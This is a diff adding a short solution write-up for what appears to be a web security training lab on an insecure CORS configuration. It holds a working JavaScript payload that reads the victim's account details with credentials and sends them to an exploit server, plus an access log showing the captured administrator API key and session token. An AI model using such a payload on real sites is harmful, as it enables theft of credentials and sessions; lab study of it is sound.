@@ -1,0 +1,30 @@
+This website has an insecure CORS configuration in that it trusts all origins.
+
+To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload 
+the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
+
+
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get', 'https://0a3200c3034885fd8109f23500750071.web-security-academy.net/accountDetails', true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        // Encode the API key to ensure it is safely included in the URL
+        var apiKey = encodeURIComponent(this.responseText);
+        // Correctly reference the /log endpoint on your exploit server
+        location = 'https://exploit-0a14009203d585918177f12601ee00aa.exploit-server.net/log?APIkey=' + apiKey;
+    }
+</script>
+
+this gives in the access logs:
+"GET /log?APIkey={
+  "username": "administrator",
+  "email": "",
+  "apikey": "QtkVxfyfnyCdrcfRiHKRgw1AzoHJGwKv",
+  "sessions": [
+    "LfD9OwVOB1qOJJnLQ5DWHCVeKSV3HEPo"
+  ]
+} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
